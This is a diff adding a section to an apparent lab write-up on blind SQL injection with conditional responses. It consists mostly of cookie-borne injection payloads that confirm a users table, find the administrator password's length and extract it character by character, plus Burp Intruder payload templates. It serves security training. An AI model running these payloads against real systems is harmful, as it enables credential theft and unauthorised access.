@@ -137,3 +137,49 @@ In order to retrieve data we need to do that only on the second position using c
 			
 
 ## 10. Blind SQL injection with conditional responses
+
+We will perform injection based on the session cookie response (welcome back message)
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh
+```
+
+Blind testing using boolean conditioning
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND 1=1--
+```
+
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND 1=0--
+```
+
+Blind testing for users table
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT 'a' FROM users LIMIT 1)='a'--
+```
+
+Testing for username row value = administrator
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT 'a' FROM users WHERE username='administrator' LIMIT 1)='a'--
+```
+
+Checking the char. length of the password
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1 )='a'--
+```
+
+Using a Sniper Payload for efficiency&speed (found that password length = 20)
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§ )='a'--
+```
+
+Checking if first character of the password = 'a' using SUBSTRING(field, position, length)
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
+```
+
+Using Cluster Bomb payload for efficiency&speed for all the positions (1-20)(a-z)
+```
+Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
+```
+
+## 11. Blind SQL injection with conditional errors
